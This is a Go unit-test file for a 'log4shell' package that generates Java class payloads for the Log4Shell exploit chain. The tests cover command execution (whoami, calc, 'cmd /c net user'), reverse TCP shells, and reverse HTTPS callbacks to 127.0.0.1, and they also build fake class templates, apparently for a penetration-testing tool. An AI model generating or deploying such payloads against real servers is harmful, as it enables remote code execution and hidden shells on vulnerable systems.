package log4shell

import (
	"bytes"
	"encoding/binary"
	"os"
	"testing"

	"github.com/davecgh/go-spew/spew"
	"github.com/stretchr/testify/require"
)

func TestGenerateExecute(t *testing.T) {
	template, err := os.ReadFile("testdata/template/Execute.class")
	require.NoError(t, err)
	spew.Dump(template)

	t.Run("common", func(t *testing.T) {
		class, err := GenerateExecute(template, "whoami", "Test")
		require.NoError(t, err)
		spew.Dump(class)
	})

	t.Run("default class", func(t *testing.T) {
		class, err := GenerateExecute(template, "${cmd}", "")
		require.NoError(t, err)
		spew.Dump(class)

		require.Equal(t, template, class)
	})

	t.Run("compare with Calc", func(t *testing.T) {
		class, err := GenerateExecute(template, "calc", "Calc")
		require.NoError(t, err)
		spew.Dump(class)

		expected, err := os.ReadFile("testdata/template/compare/Calc.class")
		require.NoError(t, err)
		require.Equal(t, expected, class)
	})

	t.Run("compare with Notepad", func(t *testing.T) {
		class, err := GenerateExecute(template, "notepad", "Notepad")
		require.NoError(t, err)
		spew.Dump(class)

		expected, err := os.ReadFile("testdata/template/compare/Notepad.class")
		require.NoError(t, err)
		require.Equal(t, expected, class)
	})

	t.Run("invalid template", func(t *testing.T) {
		t.Run("invalid size", func(t *testing.T) {
			class, err := GenerateExecute(nil, "", "")
			require.EqualError(t, err, "invalid Java class template file size")
			require.Zero(t, class)
		})

		t.Run("invalid data", func(t *testing.T) {
			class, err := GenerateExecute(bytes.Repeat([]byte{0x00}, 8), "", "")
			require.EqualError(t, err, "invalid Java class template file")
			require.Zero(t, class)
		})
	})

	t.Run("empty command", func(t *testing.T) {
		class, err := GenerateExecute(template, "", "Test")
		require.EqualError(t, err, "empty command")
		require.Zero(t, class)
	})
}

func TestGenerateSystem(t *testing.T) {
	template, err := os.ReadFile("testdata/template/System.class")
	require.NoError(t, err)
	spew.Dump(template)

	t.Run("common", func(t *testing.T) {
		class, err := GenerateSystem(template, "cmd", "/c whoami", "Test")
		require.NoError(t, err)
		spew.Dump(class)
	})

	t.Run("default class", func(t *testing.T) {
		class, err := GenerateSystem(template, "${bin}", "${args}", "")
		require.NoError(t, err)
		spew.Dump(class)

		require.Equal(t, template, class)
	})

	t.Run("compare", func(t *testing.T) {
		class, err := GenerateSystem(template, "cmd", "/c net user", "NetUser")
		require.NoError(t, err)
		spew.Dump(class)

		expected, err := os.ReadFile("testdata/template/compare/NetUser.class")
		require.NoError(t, err)
		require.Equal(t, expected, class)
	})

	t.Run("invalid template", func(t *testing.T) {
		t.Run("invalid size", func(t *testing.T) {
			class, err := GenerateSystem(nil, "", "", "")
			require.EqualError(t, err, "invalid Java class template file size")
			require.Zero(t, class)
		})

		t.Run("invalid data", func(t *testing.T) {
			class, err := GenerateSystem(bytes.Repeat([]byte{0x00}, 8), "", "", "")
			require.EqualError(t, err, "invalid Java class template file")
			require.Zero(t, class)
		})
	})

	t.Run("empty binary", func(t *testing.T) {
		class, err := GenerateSystem(template, "", "", "Test")
		require.EqualError(t, err, "empty binary")
		require.Zero(t, class)
	})
}

func TestGenerateReverseTCP(t *testing.T) {
	template, err := os.ReadFile("testdata/template/ReverseTCP.class")
	require.NoError(t, err)
	spew.Dump(template)

	t.Run("common", func(t *testing.T) {
		class, err := GenerateReverseTCP(template, "127.0.0.1", 9979, "", "Test")
		require.NoError(t, err)
		spew.Dump(class)
	})

	t.Run("default class", func(t *testing.T) {
		class, err := GenerateReverseTCP(template, "127.0.0.1", 9979, "test", "")
		require.NoError(t, err)
		spew.Dump(class)
	})

	t.Run("compare", func(t *testing.T) {
		class, err := GenerateReverseTCP(template, "127.0.0.1", 9979, "test", "ReTCP")
		require.NoError(t, err)
		spew.Dump(class)

		expected, err := os.ReadFile("testdata/template/compare/ReTCP.class")
		require.NoError(t, err)
		require.Equal(t, expected, class)
	})

	t.Run("invalid template", func(t *testing.T) {
		t.Run("invalid size", func(t *testing.T) {
			class, err := GenerateReverseTCP(nil, "", 0, "", "")
			require.EqualError(t, err, "invalid Java class template file size")
			require.Zero(t, class)
		})

		t.Run("invalid data", func(t *testing.T) {
			class, err := GenerateReverseTCP(bytes.Repeat([]byte{0x00}, 8), "", 0, "", "")
			require.EqualError(t, err, "invalid Java class template file")
			require.Zero(t, class)
		})
	})

	t.Run("empty host", func(t *testing.T) {
		class, err := GenerateReverseTCP(template, "", 1234, "", "")
		require.EqualError(t, err, "empty host")
		require.Zero(t, class)
	})

	t.Run("zero port", func(t *testing.T) {
		class, err := GenerateReverseTCP(template, "127.0.0.1", 0, "", "")
		require.EqualError(t, err, "zero port")
		require.Zero(t, class)
	})
}

func TestGenerateReverseHTTPS(t *testing.T) {
	template, err := os.ReadFile("testdata/template/ReverseHTTPS.class")
	require.NoError(t, err)
	spew.Dump(template)

	t.Run("common", func(t *testing.T) {
		class, err := GenerateReverseHTTPS(template, "127.0.0.1", 8443, "test", "", "", "Test")
		require.NoError(t, err)
		spew.Dump(class)
	})

	t.Run("default class", func(t *testing.T) {
		class, err := GenerateReverseHTTPS(template, "127.0.0.1", 8443, "test", "", "", "")
		require.NoError(t, err)
		spew.Dump(class)
	})

	t.Run("compare", func(t *testing.T) {
		class, err := GenerateReverseHTTPS(template, "127.0.0.1", 8443, "test", "", "test", "ReHTTPS")
		require.NoError(t, err)
		spew.Dump(class)

		expected, err := os.ReadFile("testdata/template/compare/ReHTTPS.class")
		require.NoError(t, err)
		require.Equal(t, expected, class)
	})

	t.Run("invalid template", func(t *testing.T) {
		t.Run("invalid size", func(t *testing.T) {
			class, err := GenerateReverseHTTPS(nil, "", 0, "", "", "", "")
			require.EqualError(t, err, "invalid Java class template file size")
			require.Zero(t, class)
		})

		t.Run("invalid data", func(t *testing.T) {
			class, err := GenerateReverseHTTPS(bytes.Repeat([]byte{0x00}, 8), "", 0, "", "", "", "")
			require.EqualError(t, err, "invalid Java class template file")
			require.Zero(t, class)
		})
	})

	t.Run("empty host", func(t *testing.T) {
		class, err := GenerateReverseHTTPS(template, "", 1234, "", "", "", "")
		require.EqualError(t, err, "empty host")
		require.Zero(t, class)
	})

	t.Run("zero port", func(t *testing.T) {
		class, err := GenerateReverseHTTPS(template, "127.0.0.1", 0, "", "", "", "")
		require.EqualError(t, err, "zero port")
		require.Zero(t, class)
	})
}

func TestGenerateReverseTCP_Fake(t *testing.T) {
	t.Run("template", func(t *testing.T) {
		const (
			fileName  = "ReverseTCP.java"
			hostFlag  = "${host}"
			portFlag  = "${port}"
			tokenFlag = "${token}"
			className = "ReverseTCP\x0C"
		)

		buf := bytes.NewBuffer(make([]byte, 0, 128))
		buf.Write([]byte{0xCA, 0xFE})
		buf.Write([]byte{0x00, 0x00})

		size := make([]byte, 2)

		binary.BigEndian.PutUint16(size, uint16(len(fileName)))
		buf.Write(size)
		buf.WriteString(fileName)
		buf.Write([]byte{0x00, 0x00})

		binary.BigEndian.PutUint16(size, uint16(len(hostFlag)))
		buf.Write(size)
		buf.WriteString(hostFlag)
		buf.Write([]byte{0x00, 0x00})

		binary.BigEndian.PutUint16(size, uint16(len(portFlag)))
		buf.Write(size)
		buf.WriteString(portFlag)
		buf.Write([]byte{0x00, 0x00})

		binary.BigEndian.PutUint16(size, uint16(len(tokenFlag)))
		buf.Write(size)
		buf.WriteString(tokenFlag)
		buf.Write([]byte{0x00, 0x00})

		binary.BigEndian.PutUint16(size, uint16(len(className)))
		buf.Write(size)
		buf.WriteString(className)
		buf.Write([]byte{0x00, 0x00})

		err := os.WriteFile("testdata/template/ReverseTCP.class", buf.Bytes(), 0600)
		require.NoError(t, err)
	})

	t.Run("compare", func(t *testing.T) {
		const (
			fileName  = "ReTCP.java"
			host      = "127.0.0.1"
			port      = "9979"
			token     = "test"
			className = "ReTCP\x0C"
		)

		buf := bytes.NewBuffer(make([]byte, 0, 128))
		buf.Write([]byte{0xCA, 0xFE})
		buf.Write([]byte{0x00, 0x00})

		size := make([]byte, 2)

		binary.BigEndian.PutUint16(size, uint16(len(fileName)))
		buf.Write(size)
		buf.WriteString(fileName)
		buf.Write([]byte{0x00, 0x00})

		binary.BigEndian.PutUint16(size, uint16(len(host)))
		buf.Write(size)
		buf.WriteString(host)
		buf.Write([]byte{0x00, 0x00})

		binary.BigEndian.PutUint16(size, uint16(len(port)))
		buf.Write(size)
		buf.WriteString(port)
		buf.Write([]byte{0x00, 0x00})

		binary.BigEndian.PutUint16(size, uint16(len(token)))
		buf.Write(size)
		buf.WriteString(token)
		buf.Write([]byte{0x00, 0x00})

		binary.BigEndian.PutUint16(size, uint16(len(className)-1))
		buf.Write(size)
		buf.WriteString(className)
		buf.Write([]byte{0x00, 0x00})

		err := os.WriteFile("testdata/template/compare/ReTCP.class", buf.Bytes(), 0600)
		require.NoError(t, err)
	})
}

func TestGenerateReverseHTTPS_Fake(t *testing.T) {
	t.Run("template", func(t *testing.T) {
		const (
			fileName  = "ReverseHTTPS.java"
			urlFlag   = "${url}"
			uaFlag    = "${ua}"
			tokenFlag = "${token}"
			className = "ReverseHTTPS\x0C"
		)

		buf := bytes.NewBuffer(make([]byte, 0, 128))
		buf.Write([]byte{0xCA, 0xFE})
		buf.Write([]byte{0x00, 0x00})

		size := make([]byte, 2)

		binary.BigEndian.PutUint16(size, uint16(len(fileName)))
		buf.Write(size)
		buf.WriteString(fileName)
		buf.Write([]byte{0x00, 0x00})

		binary.BigEndian.PutUint16(size, uint16(len(urlFlag)))
		buf.Write(size)
		buf.WriteString(urlFlag)
		buf.Write([]byte{0x00, 0x00})

		binary.BigEndian.PutUint16(size, uint16(len(uaFlag)))
		buf.Write(size)
		buf.WriteString(uaFlag)
		buf.Write([]byte{0x00, 0x00})

		binary.BigEndian.PutUint16(size, uint16(len(tokenFlag)))
		buf.Write(size)
		buf.WriteString(tokenFlag)
		buf.Write([]byte{0x00, 0x00})

		binary.BigEndian.PutUint16(size, uint16(len(className)))
		buf.Write(size)
		buf.WriteString(className)
		buf.Write([]byte{0x00, 0x00})

		err := os.WriteFile("testdata/template/ReverseHTTPS.class", buf.Bytes(), 0600)
		require.NoError(t, err)
	})

	t.Run("compare", func(t *testing.T) {
		const (
			fileName = "ReHTTPS.java"
			url      = "https://127.0.0.1:8443/test/" +
				"0YjdeS7_m93CecZoo8Ntkgs8lRd8_P50Ud2378Ggsvu0FX3VfHF2jbRAQxfUk1Uklj" +
				"sZ0Pwz-_bPfTMmytR-fhVGYvyEm-bPNat3i0XRJnm5oH76MBegc7AG3hEe1J1WG3PD" +
				"vddN5Id06qqBQR9lZAkJNzFB6VPRJmbsvp_LKp3JDg70FrOcjczkGSRbeht14__lN"
			ua        = "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko"
			token     = "test"
			className = "ReHTTPS\x0C"
		)

		buf := bytes.NewBuffer(make([]byte, 0, 128))
		buf.Write([]byte{0xCA, 0xFE})
		buf.Write([]byte{0x00, 0x00})

		size := make([]byte, 2)

		binary.BigEndian.PutUint16(size, uint16(len(fileName)))
		buf.Write(size)
		buf.WriteString(fileName)
		buf.Write([]byte{0x00, 0x00})

		binary.BigEndian.PutUint16(size, uint16(len(url)))
		buf.Write(size)
		buf.WriteString(url)
		buf.Write([]byte{0x00, 0x00})

		binary.BigEndian.PutUint16(size, uint16(len(ua)))
		buf.Write(size)
		buf.WriteString(ua)
		buf.Write([]byte{0x00, 0x00})

		binary.BigEndian.PutUint16(size, uint16(len(token)))
		buf.Write(size)
		buf.WriteString(token)
		buf.Write([]byte{0x00, 0x00})

		binary.BigEndian.PutUint16(size, uint16(len(className)-1))
		buf.Write(size)
		buf.WriteString(className)
		buf.Write([]byte{0x00, 0x00})

		err := os.WriteFile("testdata/template/compare/ReHTTPS.class", buf.Bytes(), 0600)
		require.NoError(t, err)
	})
}
